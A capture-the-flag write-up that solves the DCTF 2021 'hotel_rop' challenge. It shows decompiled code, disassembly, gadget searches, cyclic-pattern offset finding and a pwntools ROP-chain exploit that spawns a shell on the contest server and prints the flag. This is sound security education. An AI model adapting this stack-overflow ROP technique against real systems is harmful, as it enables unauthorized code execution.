
```bash
$ checksec --file hotel_rop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   hotel_rop
```

*vuln* function allows to input *0x100* bytes, functions *california* and *silicon_valley* assign *"/bin/sh"* to *win_land*, function *loss* calls *system(win_land)* if *param_1* is *0x1337c0de* and sum of *param_1* and *param_2* equals to *0xdeadc0de*. To use ROP to exploit, needed to call *california*, then *silicon_valley*, and finally *loss* to spawn a shell.

```c
void california(void)
{
  puts("Welcome to Hotel California");
  puts("You can sign out anytime you want, but you can never leave");
  *(undefined *)((long)&win_land + (long)len) = 0x2f;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x62;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x69;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x6e;
  len = len + 1;
  return;
}

void silicon_valley(void)
{
  puts("You want to work for Google?");
  *(undefined *)((long)&win_land + (long)len) = 0x2f;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x73;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0x68;
  len = len + 1;
  *(undefined *)((long)&win_land + (long)len) = 0;
  len = len + 1;
  return;
}

void loss(int param_1,int param_2)
{
  if (param_2 + param_1 == -0x21523f22) {
    puts("Dis is da wae to be one of our finest guests!");
    if (param_1 == 0x1337c0de) {
      puts("Now you can replace our manager!");
      system((char *)&win_land);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  }
  return;
}

void vuln(void)
{
  char local_28 [28];
  int local_c;
  
  puts("You come here often?");
  fgets(local_28,0x100,stdin);
  if (local_c == 0) {
    puts("Oh! You are already a regular visitor!");
  }
  else {
    puts("I think you should come here more often.");
  }
  return;
}
```

### Address Of The Three

The program printed address of *main* function, with it we could find address of the three functions about to call by adding the difference.

```python
main_addr = pr.readline().strip().decode()
main_addr = int(main_addr[main_addr.find('street ')+7:], 16)
print('main @', hex(main_addr))

ca_addr = main_addr + (elf.sym['california']-elf.sym['main'])
si_addr = main_addr + (elf.sym['silicon_valley']-elf.sym['main'])
loss_addr = main_addr + (elf.sym['loss']-elf.sym['main'])
```

### Pass The Parameters

According to *objdump* output, *loss* used register *edi* and *esi* for the two parameters. The payload format was ``<padding><california address><silicon_valley address><pop rdi gadget><0x1337c0de><pop rsi gadget><0xdeadc0de-0x1337c0de><loss address>``.

```asm
0000000000001185 <loss>:
    1185:       55                      push   %rbp
    1186:       48 89 e5                mov    %rsp,%rbp
    1189:       48 83 ec 10             sub    $0x10,%rsp
    118d:       89 7d fc                mov    %edi,-0x4(%rbp)
    1190:       89 75 f8                mov    %esi,-0x8(%rbp)
    1193:       8b 55 fc                mov    -0x4(%rbp),%edx
    1196:       8b 45 f8                mov    -0x8(%rbp),%eax
    1199:       01 d0                   add    %edx,%eax
    119b:       3d de c0 ad de          cmp    $0xdeadc0de,%eax
    11a0:       75 37                   jne    11d9 <loss+0x54>
    11a2:       48 8d 3d 5f 0e 00 00    lea    0xe5f(%rip),%rdi        # 2008 <_IO_stdin_used+0x8>
    11a9:       e8 82 fe ff ff          callq  1030 <puts@plt>
    11ae:       81 7d fc de c0 37 13    cmpl   $0x1337c0de,-0x4(%rbp)
    11b5:       75 22                   jne    11d9 <loss+0x54>
    11b7:       48 8d 3d 7a 0e 00 00    lea    0xe7a(%rip),%rdi        # 2038 <_IO_stdin_used+0x38>
    11be:       e8 6d fe ff ff          callq  1030 <puts@plt>
    11c3:       48 8d 3d a6 2e 00 00    lea    0x2ea6(%rip),%rdi        # 4070 <win_land>
    11ca:       e8 71 fe ff ff          callq  1040 <system@plt>
    11cf:       bf 00 00 00 00          mov    $0x0,%edi
    11d4:       e8 a7 fe ff ff          callq  1080 <exit@plt>
    11d9:       90                      nop
    11da:       c9                      leaveq 
    11db:       c3                      retq 
```

*pwn.rop* couldn't find *'pop rsi;ret'* gadget, an alternative was *'pop rsi ; pop r15 ; ret'*.

```bash
$ ROPgadget --binary hotel_rop |grep pop\ rsi
0x0000000000001409 : pop rsi ; pop r15 ; ret
```

```python
pop_rdi = pwn.p64(main_addr+(rop.find_gadget(['pop rdi', 'ret']).address-elf.sym['main']))
pop_rsi = pwn.p64(main_addr+(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address-elf.sym['main']))
```

### Padding Size

Used cyclic string to find padding, which is 40 bytes for this program.

```bash
gef➤  pattern create 100   
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa       
[+] Saved as '$_gef0'                                                               
gef➤  r                                                                                                                                                                 
Starting program: /home/zex/lab_ex/hacking-lab/dctf-2021/hotel-rop/hotel_rop                                                                                            
Welcome to Hotel ROP, on main street 0x55555555536d                                                                                                                     
You come here often?                                                                
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  
...
[#0] Id 1, Name: "hotel_rop", stopped 0x55555555536c in vuln (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555536c → vuln()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7fffffffdac8:
 rip = 0x55555555536c in vuln; saved rip = 0x6161616161616166
 called by frame at 0x7fffffffdad8
 Arglist at 0x6161616161616165, args: 
 Locals at 0x6161616161616165, Previous frame's sp is 0x7fffffffdad0
 Saved registers:
  rip at 0x7fffffffdac8
gef➤  pattern search 0x6161616161616166
[+] Searching '0x6161616161616166'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search) 
```


### Cat Flag.txt

The payload can be prepared as follow.

```python

payload = b'A'*40
payload += pwn.p64(ca_addr)
payload += pwn.p64(si_addr)
payload += pop_rdi + pwn.p64(0x1337c0de)
payload += pop_rsi + pwn.p64(0xcb760000) + pwn.p64(0xcb760000)
payload += pwn.p64(loss_addr)
```

With prepared payload can finally request to print the flag.

```
print(len(payload), payload)
pr.sendafter('often?\n', payload)
pr.sendline()
pr.sendline('cat flag.txt')
print(pr.readall(4))
```

```bash
$ python3 exploit.py 
[+] Opening connection to dctf1-chall-hotel-rop.westeurope.azurecontainer.io on port 7480: Done
[*] '/home/zex/lab_ex/hacking-lab/dctf-2021/hotel-rop/hotel_rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for 'hotel_rop'
main @ 0x5611556aa36d
ca @ 0x5611556aa1dc
si @ 0x5611556aa283
loss @ 0x5611556aa185
104 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdc\xa1jU\x11V\x00\x00\x83\xa2jU\x11V\x00\x00\x0b\xa4jU\x11V\x00\x00\xde\xc07\x13\x00\x00\x00\x00\t\xa4jU\x11V\x00\x00\x00\x00v\xcb\x00\x00\x00\x00\x00\x00v\xcb\x00\x00\x00\x00\x85\xa1jU\x11V\x00\x00'
[+] Receiving all data: Done (257B)
[*] Closed connection to dctf1-chall-hotel-rop.westeurope.azurecontainer.io port 7480
b'I think you should come here more often.\nWelcome to Hotel California\nYou can sign out anytime you want, but you can never leave\nYou want to work for Google?\nDis is da wae to be one of our finest guests!\nNow you can replace our manager!\ndctf{ch41n_0f_h0t3ls}'
```

For full source code checkout [here](https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/hotel-rop/exploit.py).
